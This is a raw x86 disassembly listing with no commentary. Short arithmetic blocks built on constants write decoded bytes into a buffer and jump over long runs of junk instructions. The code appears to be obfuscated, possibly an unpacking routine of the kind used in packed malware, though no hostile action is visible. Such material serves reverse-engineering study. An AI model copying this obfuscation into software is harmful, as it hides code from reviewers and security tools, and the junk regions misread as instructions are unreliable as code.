  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xc4
  416d7e:	loopne 0x416d1d
  416d80:	jo     0x416dfc
  416d82:	hlt    
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    BYTE PTR [esi],cl
  416d8a:	inc    eax
  416d8b:	and    BYTE PTR [eax],dh
  416d8d:	mov    ds:0x33770fa2,eax
  416d92:	mov    DWORD PTR [ecx+0x5aab735c],edi
  416d98:	std    
  416d99:	clc    
  416d9a:	repz data16 (bad) 
  416d9d:	std    
  416d9e:	and    esp,edi
  416da0:	sahf   
  416da1:	in     al,0xa6
  416da3:	pop    es
  416da4:	out    dx,eax
  416da5:	shr    DWORD PTR [ecx+0x6a],1
  416da8:	mov    ah,cl
  416daa:	ins    BYTE PTR es:[edi],dx
  416dab:	retf   
  416dac:	scas   eax,DWORD PTR es:[edi]
  416dad:	in     eax,dx
  416dae:	ss and eax,0x4a30456c
  416db4:	xchg   BYTE PTR [esp+edi*8],al
  416db7:	cmp    al,0x3c
  416db9:	fld    DWORD PTR [edi+0x53]
  416dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dbd:	add    ecx,ebx
  416dbf:	add    ebx,DWORD PTR [ebx]
  416dc1:	repz dec edx
  416dc3:	data16 clc 
  416dc5:	lea    edx,fs:[ebp-0xe]
  416dc9:	cli    
  416dca:	inc    eax
  416dcb:	or     DWORD PTR [edx-0x5e5411e5],0x540c22c8
  416dd5:	inc    esp
  416dd6:	ror    BYTE PTR [ebx+0x2b],0xa6
  416dda:	ret    0x12c1
  416ddd:	outs   dx,DWORD PTR ds:[esi]
  416dde:	js     0x416d71
  416de0:	cmp    edx,edx
  416de2:	push   edx
  416de3:	cdq    
  416de4:	ret    
  416de5:	inc    ecx
  416de6:	xchg   ebp,eax
  416de7:	sub    dh,BYTE PTR [ebx-0x31]
  416dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416deb:	dec    ebp
  416dec:	jg     0x416e09
  416dee:	pop    ebx
  416def:	mov    ds:0x8f78f23c,al
  416df4:	adc    al,al
  416df6:	cmp    al,BYTE PTR [ecx+0x6]
  416df9:	or     ah,ch
  416dfb:	sub    DWORD PTR [ebx+0x247e72b9],edi
  416e01:	outs   dx,BYTE PTR ds:[esi]
  416e02:	daa    
  416e03:	les    eax,FWORD PTR [ebp-0x2919ebfa]
  416e09:	xor    eax,0x289d76ee
  416e0e:	(bad)  
  416e10:	add    DWORD PTR [edi-0x1f],edi
  416e13:	push   ebx
  416e14:	lahf   
  416e15:	xor    DWORD PTR ds:0x426957c5,edi
  416e1b:	enter  0xe4f9,0x89
  416e1f:	pop    ebp
  416e20:	or     al,al
  416e22:	and    BYTE PTR [ebp+ecx*1+0x42],0xb
  416e27:	mov    ds:0xf345cbd6,eax
  416e2c:	add    al,bh
  416e2e:	and    DWORD PTR [ebp+0x68],edi
  416e31:	inc    edi
  416e32:	mov    ebx,esp
  416e34:	push   cs
  416e35:	popf   
  416e36:	mov    al,ds:0xc8b7b2ab
  416e3b:	pop    esi
  416e3c:	lahf   
  416e3d:	cmp    BYTE PTR [ebp+0x74],dh
  416e40:	lods   al,BYTE PTR ds:[esi]
  416e41:	jge    0x416ea2
  416e43:	push   ds
  416e44:	pop    ss
  416e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e46:	sub    al,0xc4
  416e48:	push   DWORD PTR [eax]
  416e4a:	dec    ebp
  416e4b:	fdiv   DWORD PTR [ebx+0x54]
  416e4e:	shr    edi,1
  416e50:	push   esi
  416e51:	xchg   esp,eax
  416e52:	loop   0x416e8b
  416e54:	ror    BYTE PTR [edi],0xbf
  416e57:	pop    ebp
  416e58:	call   0x9043:0x97a8a2dc
  416e5f:	out    0x9a,al
  416e61:	int3   
  416e62:	cmc    
  416e63:	lods   al,BYTE PTR ds:[esi]
  416e64:	(bad)  
  416e65:	and    esi,DWORD PTR [esp+esi*2+0x6d]
  416e69:	mov    ah,0x73
  416e6b:	push   0x765d5cbc
  416e70:	sbb    DWORD PTR ds:0x1ac45c6d,edx
  416e76:	repz cmc 
  416e78:	jmp    0x85d9fd54
  416e7d:	lds    eax,FWORD PTR [ecx-0x4a430ed5]
  416e83:	cli    
  416e84:	aas    
  416e85:	or     DWORD PTR [ecx+0x77108ff1],esi
  416e8b:	sbb    DWORD PTR [edi+edi*1],esi
  416e8e:	cdq    
  416e8f:	inc    esp
  416e90:	add    eax,0x8bc60a8
  416e95:	mov    al,0x9a
  416e97:	jmp    0xc0fb:0xfacfd222
  416e9e:	fcom   QWORD PTR [edx-0x13b1002b]
  416ea4:	out    0x41,eax
  416ea6:	cmp    dh,BYTE PTR [ebx+ebx*4]
  416ea9:	mov    ebx,0x7430c8de
  416eae:	addr16 push ds
  416eb0:	repnz call 0x6dc9:0xba4a5aa0
  416eb8:	mov    bh,0x5
  416eba:	jnp    0x416e50
  416ebc:	aad    0xcf
  416ebe:	(bad)  
  416ebf:	pop    edx
  416ec0:	stc    
  416ec1:	dec    edi
  416ec2:	pop    ds
  416ec3:	js     0x416f10
  416ec5:	popa   
  416ec6:	adc    ecx,DWORD PTR ds:0xf8b3bdc3
  416ecc:	xchg   edi,eax
  416ecd:	sub    al,0xca
  416ecf:	or     ah,ah
  416ed1:	call   0x6a93:0x91dedf7b
  416ed8:	or     BYTE PTR [edi-0x2aaed193],0x8c
  416edf:	in     eax,dx
  416ee0:	call   0x538cc6a1
  416ee5:	xlat   BYTE PTR ds:[ebx]
  416ee6:	daa    
  416ee7:	fisubr DWORD PTR [esi+0x4360637b]
  416eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eee:	lahf   
  416eef:	idiv   BYTE PTR [edx]
  416ef1:	mov    DWORD PTR [ebp+0x3674cada],0x4fd71cfa
  416efb:	pushf  
  416efc:	in     eax,0xad
  416efe:	mov    bl,0x70
  416f00:	loopne 0x416edd
  416f02:	(bad)  
  416f03:	mov    ah,0xba
  416f05:	xchg   edi,eax
  416f06:	jle    0x416ea5
  416f08:	mov    DWORD PTR [ebp+0x6e],edi
  416f0b:	xor    BYTE PTR [edi],al
  416f0d:	adc    bl,bh
  416f0f:	shl    DWORD PTR gs:[ebx-0x4c],0x2a
  416f14:	popa   
  416f15:	test   dh,dl
  416f17:	sub    eax,0x7d329417
  416f1c:	in     al,0x45
  416f1e:	and    DWORD PTR [ebx-0x625c0d0b],eax
  416f24:	or     al,0x4c
  416f26:	fistp  QWORD PTR [ebx-0x35]
  416f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f2a:	sbb    ebx,esp
  416f2c:	aam    0x4f
  416f2e:	mov    ds:0xc91cbd00,al
  416f33:	sbb    eax,0xd7609ba9
  416f38:	stos   BYTE PTR es:[edi],al
  416f39:	mov    WORD PTR [eax],gs
  416f3b:	push   edi
  416f3c:	xor    DWORD PTR [ebp+edi*4-0x7b],0x8bb847e1
  416f44:	mov    bl,0x9f
  416f46:	repnz push esi
  416f48:	xchg   esp,eax
  416f49:	test   eax,0xb2ca9afc
  416f4e:	cmp    ah,BYTE PTR [ebx+0x33]
  416f51:	mov    al,0x34
  416f53:	inc    edi
  416f54:	dec    esi
  416f55:	push   DWORD PTR [ebx+eiz*4]
  416f58:	fild   DWORD PTR [edi+eiz*1]
  416f5b:	dec    ebx
  416f5c:	fs pop ds
  416f5e:	shl    BYTE PTR [ebx],1
  416f60:	mov    ds:0xed4b3f18,al
  416f65:	mov    fs,WORD PTR [edx]
  416f67:	pop    ecx
  416f68:	push   esi
  416f69:	push   0x788158b3
  416f6e:	xor    cl,ah
  416f70:	or     eax,0x28a83195
  416f75:	in     al,dx
  416f76:	pusha  
  416f77:	mov    dl,0x4e
  416f79:	int    0x5
  416f7b:	call   0xa3d7:0x944272de
  416f82:	inc    ecx
  416f83:	dec    ebx
  416f84:	ins    DWORD PTR es:[edi],dx
  416f85:	dec    esi
  416f86:	test   bh,bh
  416f88:	pop    ds
  416f89:	call   0x2407607d
  416f8e:	les    ecx,FWORD PTR [ecx+edi*1+0x29]
  416f92:	dec    ebx
  416f93:	test   al,0x53
  416f95:	out    0x34,al
  416f97:	xlat   BYTE PTR ds:[ebx]
  416f98:	lds    ebx,FWORD PTR [esi-0x36]
  416f9b:	and    edx,edx
  416f9d:	popf   
  416f9e:	icebp  
  416f9f:	mov    ebx,0x9611d001
  416fa4:	ins    BYTE PTR es:[edi],dx
  416fa5:	jb     0x417025
  416fa7:	scas   eax,DWORD PTR es:[edi]
  416fa8:	scas   eax,DWORD PTR es:[edi]
  416fa9:	test   DWORD PTR [ebp-0x2b6b88c9],esi
  416faf:	pop    ebp
  416fb0:	sub    eax,DWORD PTR [esi+0x43]
  416fb3:	imul   edx,DWORD PTR [eax+0x39],0x4d
  416fb7:	fisttp QWORD PTR [ecx]
  416fb9:	rcl    DWORD PTR [edx],0x63
  416fbc:	push   ds
  416fbd:	cmc    
  416fbe:	mov    eax,0xcc2eebe5
  416fc3:	dec    edx
  416fc4:	inc    edx
  416fc5:	mov    eax,ds:0xf5cf750
  416fca:	sti    
  416fcb:	ja     0x416fbc
  416fcd:	lods   al,BYTE PTR ds:[esi]
  416fce:	ret    0x3a31
  416fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd2:	cmpxchg DWORD PTR [eax+0x30bed76a],edi
  416fd9:	sar    BYTE PTR [edi+ebx*1],1
  416fdc:	retf   
  416fdd:	pop    es
  416fde:	and    BYTE PTR [ecx-0x7a0ef602],0x93
  416fe5:	aad    0x36
  416fe7:	push   ecx
  416fe8:	mov    ds:0x4ff9f0f1,eax
  416fed:	repz adc al,0x8d
  416ff0:	inc    ecx
  416ff1:	xchg   edi,eax
  416ff2:	cmp    DWORD PTR [edx-0x70],esp
  416ff5:	fisubr WORD PTR [edx+0x0]
  416ff8:	xchg   ah,ah
  416ffa:	out    0xb7,eax
  416ffc:	gs jmp 0x416f80
  416fff:	(bad)  
  417000:	lahf   
  417001:	out    0xd3,al
  417003:	fild   WORD PTR [ecx]
  417005:	retf   
  417006:	shl    DWORD PTR [ecx],0x1c
  417009:	loope  0x417027
  41700b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41700c:	cld    
  41700d:	push   ebp
  41700e:	shl    BYTE PTR [ebp+0x4a0a0f6e],cl
  417014:	pop    ds
  417015:	fdivr  st,st(7)
  417017:	inc    ecx
  417018:	fidivr DWORD PTR [edx-0x5c]
  41701b:	and    BYTE PTR [ebx],dh
  41701d:	jp     0x417066
  41701f:	xchg   edx,eax
  417020:	push   esi
  417021:	xchg   ebp,eax
  417022:	and    al,0xe7
  417024:	pop    ss
  417025:	mov    ch,0x4c
  417027:	lock das 
  417029:	nop
  41702a:	retf   
  41702b:	xor    al,0xce
  41702d:	pop    es
  41702e:	(bad)  
  41702f:	(bad)  
  417030:	jnp    0x41708a
  417032:	sbb    DWORD PTR [ebp-0x577f1d21],edi
  417038:	clc    
  417039:	leave  
  41703a:	push   esp
  41703b:	pop    ds
  41703c:	cld    
  41703d:	shl    BYTE PTR [esi+ebp*1],cl
  417040:	cs (bad) 
  417042:	xor    eax,DWORD PTR [ecx+0x2e1cf944]
  417048:	shl    DWORD PTR [ebx+0x7b],cl
  41704b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41704c:	out    dx,eax
  41704d:	and    edx,ebp
  41704f:	std    
  417050:	stos   BYTE PTR es:[edi],al
  417051:	sub    eax,0x4b8e4174
  417056:	sbb    DWORD PTR [ebp+0x178b7337],edi
  41705c:	stos   DWORD PTR es:[edi],eax
  41705d:	inc    edx
  41705e:	jp     0x416ff4
  417060:	mov    ecx,ebp
  417062:	push   0x8d9d2a41
  417067:	jne    0x4170d0
  417069:	js     0x417073
  41706b:	xlat   BYTE PTR ds:[ebx]
  41706c:	adc    ebx,DWORD PTR [edi-0x74eba8eb]
  417072:	xchg   esp,eax
  417073:	mov    edi,0xc4c6bd24
  417078:	fiadd  DWORD PTR [ecx-0x7f]
  41707b:	mov    ebx,0xb230605e
  417080:	fldcw  WORD PTR [ebp-0x42943679]
  417086:	aaa    
  417087:	sti    
  417088:	(bad)  
  417089:	nop
  41708a:	and    al,cl
  41708c:	mov    bh,0x90
  41708e:	in     al,0x1a
  417090:	out    dx,eax
  417091:	mov    cl,0x68
  417093:	and    DWORD PTR [ebp-0x21ada92a],ecx
  417099:	fdivp  st(2),st
  41709b:	leave  
  41709c:	mov    bh,0xf0
  41709e:	(bad)  
  41709f:	cli    
  4170a0:	xchg   BYTE PTR [edx+eax*8],bl
  4170a3:	mov    bl,0xe1
  4170a5:	or     DWORD PTR [ebx],ecx
  4170a7:	cmp    ecx,DWORD PTR gs:[ebx+0x4d8bf045]
  4170ae:	in     al,dx
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xbc97e856
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    cl,cl
  41719f:	push   ds
  4171a0:	sbb    bh,bl
  4171a2:	nop
  4171a3:	ret    
  4171a4:	neg    BYTE PTR [eax-0x7b]
  4171a7:	xlat   BYTE PTR ds:[ebx]
  4171a8:	int3   
  4171a9:	push   ebp
  4171aa:	loop   0x417167
  4171ac:	sbb    ah,dh
  4171ae:	cmc    
  4171af:	sub    ah,ch
  4171b1:	adc    eax,0x2ddbccb4
  4171b6:	push   esi
  4171b7:	push   ecx
  4171b8:	inc    edi
  4171b9:	jnp    0x417151
  4171bb:	imul   esi,DWORD PTR [edi-0x62],0x6a
  4171bf:	mov    ds:0x89407107,eax
  4171c4:	data16 fcmove st,st(3)
  4171c7:	xor    ebx,DWORD PTR [ebp-0x7eb928bf]
  4171cd:	lods   eax,DWORD PTR ds:[esi]
  4171ce:	ret    
  4171cf:	rcr    BYTE PTR [edx],1
  4171d1:	test   DWORD PTR [edi-0x54fc0fbf],esi
  4171d7:	mov    ebx,0xeea36e66
  4171dc:	mov    dl,0xe3
  4171de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171df:	out    0x7e,eax
  4171e1:	pusha  
  4171e2:	xor    al,0x53
  4171e4:	test   edx,eax
  4171e6:	lahf   
  4171e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e8:	fiadd  WORD PTR [ebx+esi*1-0x41789426]
  4171ef:	lahf   
  4171f0:	rcl    DWORD PTR [ecx],0x1f
  4171f3:	push   0xffffffd1
  4171f5:	cmp    eax,0xbbacafd
  4171fa:	out    0x60,al
  4171fc:	fsub   st,st(7)
  4171fe:	scas   al,BYTE PTR es:[edi]
  4171ff:	inc    eax
  417200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417201:	xchg   esi,eax
  417202:	aas    
  417203:	fidiv  WORD PTR [eax-0x67]
  417206:	paddb  mm0,QWORD PTR [edx-0x2a]
  41720a:	jecxz  0x417279
  41720c:	adc    ebp,DWORD PTR [ecx-0x4479d1d7]
  417212:	out    0xe4,al
  417214:	push   edi
  417215:	retf   0xb178
  417218:	mov    ebx,0xd9b63eb
  41721d:	js     0x417231
  41721f:	fdiv   QWORD PTR [edi]
  417221:	stos   BYTE PTR es:[edi],al
  417222:	sub    ch,BYTE PTR [eax+0x41]
  417225:	jmp    0xb00b:0x2cee6a35
  41722c:	outs   dx,DWORD PTR ds:[esi]
  41722d:	out    dx,al
  41722e:	mov    bl,0xfd
  417230:	xor    bh,dh
  417232:	add    al,dl
  417234:	retf   
  417235:	icebp  
  417236:	call   0x4e16a3a7
  41723b:	fcom   DWORD PTR [ecx]
  41723d:	ss div dl
  417240:	and    bl,BYTE PTR [ebx-0x41]
  417243:	mov    ds:0xf091e44a,eax
  417248:	loope  0x4171fb
  41724a:	lock pop ds
  41724c:	adc    BYTE PTR [eax-0x15],ah
  41724f:	aad    0x2c
  417251:	push   esi
  417252:	push   ebx
  417253:	jmp    0x2701:0xa225d792
  41725a:	(bad)  
  41725b:	cmp    esp,esi
  41725d:	jno    0x417201
  41725f:	test   eax,0xc6369a51
  417264:	xor    eax,DWORD PTR [esi-0x391f8409]
  41726a:	jmp    esi
  41726c:	or     DWORD PTR [esi+eax*8],edi
  41726f:	push   eax
  417270:	jae    0x4171f9
  417272:	pusha  
  417273:	mov    esp,0xf88fa9f0
  417278:	push   ds
  417279:	retf   
  41727a:	or     eax,DWORD PTR [eax-0x294e6532]
  417280:	(bad)  
  417281:	mov    dl,0xcc
  417283:	pop    edx
  417284:	push   ebp
  417285:	pop    ebx
  417286:	in     eax,0x4e
  417288:	add    DWORD PTR [ecx],esp
  41728a:	cli    
  41728b:	aam    0x2e
  41728d:	dec    ebx
  41728e:	add    ebx,DWORD PTR [ecx]
  417290:	jnp    0x4172af
  417292:	sbb    dh,BYTE PTR [edi]
  417294:	cwde   
  417295:	and    BYTE PTR [ebp+0x43fb09ed],0x2
  41729c:	jp     0x4172de
  41729e:	jecxz  0x41727f
  4172a0:	push   ecx
  4172a1:	stos   DWORD PTR es:[edi],eax
  4172a2:	nop
  4172a3:	aaa    
  4172a4:	imul   edi,ebx,0xffffffc3
  4172a7:	mov    ecx,0x47e7eda7
  4172ac:	data16 lahf 
  4172ae:	pushf  
  4172af:	in     eax,dx
  4172b0:	jle    0x41725e
  4172b2:	in     al,0x7d
  4172b4:	or     al,0x4
  4172b6:	in     al,dx
  4172b7:	jo     0x417290
  4172b9:	mov    eax,0xd932c986
  4172be:	not    dl
  4172c0:	adc    al,0x97
  4172c2:	lods   eax,DWORD PTR ds:[esi]
  4172c3:	jns    0x417333
  4172c5:	iret   
  4172c6:	pop    ss
  4172c7:	fistp  QWORD PTR [ebp+0x41288c49]
  4172cd:	daa    
  4172ce:	inc    esp
  4172cf:	jns    0x417290
  4172d1:	jmp    0x7a218f08
  4172d6:	xchg   edx,eax
  4172d7:	enter  0x87c2,0x9f
  4172db:	inc    esp
  4172dc:	xchg   ebp,eax
  4172dd:	adc    BYTE PTR [ecx+0x46],ch
  4172e0:	xchg   edi,eax
  4172e1:	jnp    0x4172e4
  4172e3:	xor    al,0xab
  4172e5:	push   eax
  4172e6:	xor    al,BYTE PTR [esi-0x66]
  4172e9:	or     al,BYTE PTR [edi-0x3b86a740]
  4172ef:	mov    edi,0xce2e137
  4172f4:	xchg   ecx,eax
  4172f5:	(bad)
  4172f8:	and    ch,BYTE PTR [esi-0x3399969f]
  4172fe:	fisubr WORD PTR [edx+ebp*4]
  417301:	repz retf 
  417303:	push   eax
  417304:	push   esi
  417305:	cmp    al,0xd0
  417307:	lea    eax,[edx-0x73c6afb1]
  41730d:	ss dec esp
  41730f:	mov    al,ds:0x966abf5a
  417314:	pushf  
  417315:	sub    al,BYTE PTR [ebp+0x1226b7e6]
  41731b:	outs   dx,DWORD PTR ds:[esi]
  41731c:	call   0x452:0x2b1b59a0
  417323:	(bad)  
  417324:	iret   
  417325:	sbb    al,0xa0
  417327:	aas    
  417328:	retf   
  417329:	mov    DWORD PTR [ebx+esi*4-0x5c794bda],edi
  417330:	jmp    0x4173b1
  417332:	stos   DWORD PTR es:[edi],eax
  417333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417334:	xor    al,0x82
  417336:	mov    ecx,0x114cc9d3
  41733b:	stos   DWORD PTR es:[edi],eax
  41733c:	push   cs
  41733d:	dec    ecx
  41733e:	lahf   
  41733f:	cmp    ch,ch
  417341:	pop    edx
  417342:	sub    al,0xae
  417344:	xor    BYTE PTR [ebp+ebx*2-0x559ed76a],dh
  41734b:	icebp  
  41734c:	(bad)  
  41734d:	in     al,dx
  41734e:	ins    BYTE PTR es:[edi],dx
  41734f:	pusha  
  417350:	fidivr DWORD PTR [edi-0x77]
  417353:	adc    al,0x75
  417355:	cld    
  417356:	pop    es
  417357:	fidiv  DWORD PTR [ecx-0x3c]
  41735a:	lds    ecx,FWORD PTR [esi-0x6c]
  41735d:	sbb    eax,0x8e9e5847
  417362:	stc    
  417363:	rcr    DWORD PTR [ecx*8+0x4f9cc8aa],0xd9
  41736b:	adc    al,0x70
  41736d:	mov    ebx,0xff634f37
  417372:	mov    ds:0xfb2f11fa,eax
  417377:	pop    esi
  417378:	loope  0x41736d
  41737a:	ds int 0xed
  41737d:	not    DWORD PTR [edx+0x5e]
  417380:	inc    ebx
  417381:	mov    ecx,0xe0f69271
  417386:	pop    ebp
  417387:	jmp    0xd85e:0x406d7c86
  41738e:	mov    eax,ds:0x21c3891a
  417393:	pop    edi
  417394:	xor    dh,BYTE PTR [eax]
  417396:	das    
  417397:	(bad)  
  417398:	mov    ?,WORD PTR [ebp+0x68]
  41739b:	icebp  
  41739c:	data16 mov al,ds:0xd0404b3b
  4173a2:	inc    esi
  4173a3:	mov    ds:0x3f4c83e9,eax
  4173a8:	cvttps2pi mm6,QWORD PTR gs:[eax+eax*2]
  4173ad:	in     al,0xb
  4173af:	clc    
  4173b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173b1:	pop    esp
  4173b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173b3:	jo     0x417345
  4173b5:	and    eax,0x45de1f7a
  4173ba:	test   eax,0xdd3fb1a5
  4173bf:	stos   DWORD PTR es:[edi],eax
  4173c0:	out    0x24,al
  4173c2:	sub    al,0x17
  4173c4:	bound  ebp,QWORD PTR [edi]
  4173c6:	lds    edx,FWORD PTR [ebp-0x6ecf0152]
  4173cc:	and    ch,BYTE PTR [edi-0x3d]
  4173cf:	xchg   DWORD PTR [ecx-0x6838d16a],eax
  4173d5:	add    ah,0x65
  4173d8:	dec    eax
  4173d9:	loopne 0x4173c5
  4173db:	icebp  
  4173dc:	daa    
  4173dd:	lahf   
  4173de:	mov    al,dl
  4173e0:	sbb    dl,dl
  4173e2:	push   0xb133a489
  4173e7:	ret    0x1aa0
  4173ea:	jno    0x41742f
  4173ec:	out    0xa7,al
  4173ee:	adc    BYTE PTR [ecx],bh
  4173f0:	lock cmp edi,DWORD PTR [ebp-0x25486ddd]
  4173f7:	ret    0xa249
  4173fa:	mov    DWORD PTR [esp+edi*1],eax
  4173fd:	push   ds
  4173fe:	(bad)  
  4173ff:	scas   al,BYTE PTR es:[edi]
  417400:	sahf   
  417401:	mov    esp,0x4c4d09f2
  417406:	fdivrp st(4),st
  417408:	push   ecx
  417409:	pop    esp
  41740a:	inc    ebx
  41740b:	sahf   
  41740c:	cmp    dl,BYTE PTR [ebx+0x65]
  41740f:	(bad)  
  417410:	std    
  417411:	xor    DWORD PTR [edx-0x1f],ecx
  417414:	sub    eax,0x2f75d384
  417419:	ja     0x4173aa
  41741b:	push   ecx
  41741c:	test   BYTE PTR [ebp-0xa],dh
  41741f:	cmp    ch,BYTE PTR [eax-0x74a67b1a]
  417425:	repz xchg ebx,eax
  417427:	dec    esi
  417428:	mov    cl,0x77
  41742a:	dec    edx
  41742b:	aas    
  41742c:	add    al,0x9
  41742e:	pop    edx
  41742f:	add    esi,DWORD PTR [ebx]
  417431:	sbb    eax,0xb5956d5d
  417436:	xor    eax,0x2826e63b
  41743b:	add    al,0xaa
  41743d:	xor    al,0xe1
  41743f:	ds adc eax,0xf6137b1e
  417445:	cmp    ch,bh
  417447:	sbb    eax,0xbe656cc9
  41744c:	(bad)
  41744f:	jbe    0x4174ca
  417451:	jp     0x417489
  417453:	ret    
  417454:	ss ins DWORD PTR es:[edi],dx
  417456:	and    ch,BYTE PTR [ebx-0x1f]
  417459:	out    0xcf,eax
  41745b:	fimul  WORD PTR [ebp+0x5032272a]
  417461:	sub    BYTE PTR [ecx-0x30],bh
  417464:	jo     0x417409
  417466:	lahf   
  417467:	jbe    0x41748e
  417469:	adc    bh,0xc9
  41746c:	sbb    eax,0x12cde2a7
  417471:	pusha  
  417472:	out    0x2d,eax
  417474:	push   ds
  417475:	dec    ecx
  417476:	stos   BYTE PTR es:[edi],al
  417477:	jnp    0x4174e3
  417479:	jns    0x41749e
  41747b:	fadd   DWORD PTR [esi+0x4f]
  41747e:	push   ebx
  41747f:	shl    BYTE PTR [esi-0x14],1
  417482:	jg     0x4174f9
  417484:	pop    ebx
  417485:	neg    BYTE PTR [esi-0x503743ee]
  41748b:	jno    0x4174a0
  41748d:	inc    eax
  41748e:	pop    esi
  41748f:	xchg   esp,eax
  417490:	inc    eax
  417491:	(bad)  
  417492:	and    edx,DWORD PTR [ebx]
  417494:	adc    dl,BYTE PTR [ebx+edx*4+0x3af5e11d]
  41749b:	cdq    
  41749c:	sub    al,0x32
  41749e:	rol    DWORD PTR [eax-0x60],0x75
  4174a2:	stc    
  4174a3:	stos   BYTE PTR es:[edi],al
  4174a4:	mov    ecx,0x2a2445ee
  4174a9:	mov    DWORD PTR [ebp+ebp*8-0x30],esp
  4174ad:	(bad)  
  4174ae:	sbb    ch,BYTE PTR [edx+0x31c02b6d]
  4174b4:	xor    esi,DWORD PTR [ecx]
  4174b6:	fistp  QWORD PTR [ebp+0x67]
  4174b9:	adc    eax,0x7f776ede
  4174be:	pop    edx
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
